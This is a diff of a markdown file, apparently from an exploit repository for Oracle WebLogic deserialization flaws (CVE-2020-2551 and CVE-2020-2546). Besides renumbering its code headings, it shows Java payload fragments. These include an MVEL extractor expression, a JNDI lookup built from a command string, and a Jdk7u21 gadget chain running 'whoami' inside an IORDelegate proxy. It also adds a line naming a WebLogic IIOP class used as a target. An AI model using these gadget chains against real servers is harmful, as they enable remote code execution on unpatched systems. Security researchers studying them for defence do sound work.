@@ -21,7 +21,7 @@ more see:
 https://github.com/hktalent/CVE-2020-2551
 
 # 3、code
-### 3.1、code n1
+### 3.1、code1
 ```
 MVEL.compileExpression
 MvelExtractor o = new MvelExtractor("xxx;");
@@ -30,7 +30,7 @@ MvelExtractor o = new MvelExtractor("xxx;");
 		oo.flush();
 ```
 
-### 3.2、code1
+### 3.2、code2
 ```
 public MsgOutput getObject(final String command) throws Exception {
 	  String jndiAddress = command;
@@ -41,12 +41,17 @@ public MsgOutput getObject(final String command) throws Exception {
   }
 ```
 
-### 3.3、code2
+### 3.3、code3
 ```
 public IORDelegate getObject(final String command) throws Exception {
 IORDelegate ior = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", new Jdk7u21().getObject("whoami")), IORDelegate.class);
     return ior;
   }
+```
+
+### 3.4、code4
+```
+weblogic.iiop.IIOPRemoteRefd,ObjectMessageImpl
 ```
 
 # 4、CVE-2020-2546 payload
